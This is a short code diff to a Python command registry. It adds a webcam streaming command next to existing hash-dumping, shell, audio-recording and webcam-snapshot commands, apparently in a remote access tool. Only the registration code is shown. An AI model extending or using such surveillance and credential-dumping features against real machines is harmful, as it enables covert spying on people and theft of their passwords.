@@ -9,10 +9,12 @@ from .hashdump import HashdumpCommand
 from .shell import ShellCommand
 from .record_audio import AudioRecordCommand
 from .webcam_snapshot import WebcamSnapshotCommand
+from .webcam_stream import WebcamStreamCommand
 
 
 class CommandRegistry:
-    def __init__(self):
+    def __init__(self, client):
+        self.client = client
         self.commands = {}
 
         self.register(HelpCommand())
@@ -26,6 +28,7 @@ class CommandRegistry:
         self.register(ShellCommand())
         self.register(AudioRecordCommand())
         self.register(WebcamSnapshotCommand())
+        self.register(WebcamStreamCommand(client))
 
     def register(self, command):
         self.commands[command.name] = command
